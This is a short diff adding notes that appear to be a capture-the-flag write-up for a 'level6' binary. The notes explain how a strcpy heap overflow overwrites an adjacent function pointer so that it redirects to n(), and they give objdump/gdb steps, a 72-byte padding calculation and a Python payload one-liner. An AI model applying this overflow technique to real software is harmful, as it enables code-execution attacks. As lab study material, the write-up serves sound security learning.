@@ -1,0 +1,16 @@
+decompile ./level6
+
+1 function n() which is the goal
+2 malloc: 1 of buffer; 1 to store the adress that a function pointer will point to
+
+there is strcpy(dest, av[1]) which we can overflow to write the function pointer to point to n()
+
+to get the adress of n just objdump -d ./level6 | grep "<n>"
+ or use gdb
+
+ to get the padding necessary between the 2 malloc:
+ substract the adress of the 2nd malloc by the first (either with gdb or ltrace)
+
+ => 72 bytes: 64 bytes of buffer + 8 metadata 
+ python -c 'import struct; print "A" * 72 + struct.pack("<I", adress_of_n)'
+
